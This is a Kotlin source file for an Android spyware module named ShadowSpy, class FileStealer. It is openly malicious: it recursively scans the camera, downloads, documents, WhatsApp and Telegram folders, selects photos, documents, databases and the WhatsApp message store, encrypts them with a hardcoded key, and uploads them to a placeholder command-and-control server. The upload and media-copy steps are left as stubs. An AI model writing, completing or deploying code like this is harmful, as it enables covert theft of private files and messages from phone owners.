package com.shadowspy

import android.content.Context
import android.provider.MediaStore
import android.os.Environment
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class FileStealer(private val context: Context) {

    private val TAG = "ShadowSpy_FileStealer"

    // Target directories for stealing
    private val targetDirs = listOf(
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
        File("/storage/emulated/0/WhatsApp/Media"),
        File("/storage/emulated/0/Telegram")
    )

    fun scanAndStealFiles() {
        Log.d(TAG, "Starting file steal operation")
        for (dir in targetDirs) {
            if (dir.exists()) {
                stealFromDirectory(dir)
            }
        }
        // Also use MediaStore for images/videos
        stealMediaFiles()
    }

    private fun stealFromDirectory(dir: File) {
        dir.listFiles()?.forEach { file ->
            if (file.isFile && isInterestingFile(file)) {
                exfiltrateFile(file)
            } else if (file.isDirectory) {
                stealFromDirectory(file) // recursive
            }
        }
    }

    private fun isInterestingFile(file: File): Boolean {
        val name = file.name.lowercase()
        return name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".pdf") ||
               name.endsWith(".doc") || name.endsWith(".txt") || name.endsWith(".db") ||
               name.contains("msgstore") // WhatsApp DB
    }

    private fun stealMediaFiles() {
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
        val query = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, null
        )
        query?.use { cursor ->
            while (cursor.moveToNext()) {
                // Get URI and copy file logic here
                Log.d(TAG, "Found media file: ${cursor.getString(1)}")
            }
        }
    }

    private fun exfiltrateFile(file: File) {
        try {
            val encrypted = encryptFile(file)
            uploadToC2(encrypted, file.name)
            Log.d(TAG, "Exfiltrated: ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "Exfil failed for ${file.name}", e)
        }
    }

    private fun encryptFile(file: File): ByteArray {
        val key = SecretKeySpec("your-16-byte-key".toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE, key)
        return cipher.doFinal(file.readBytes())
    }

    private fun uploadToC2(data: ByteArray, filename: String) {
        // TODO: Replace with your real C2 (HTTPS/WebSocket)
        try {
            val url = URL("https://your-c2-server.com/upload")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            // send data...
            Log.d(TAG, "Uploaded $filename to C2")
        } catch (e: Exception) {
            Log.e(TAG, "Upload failed", e)
        }
    }
}
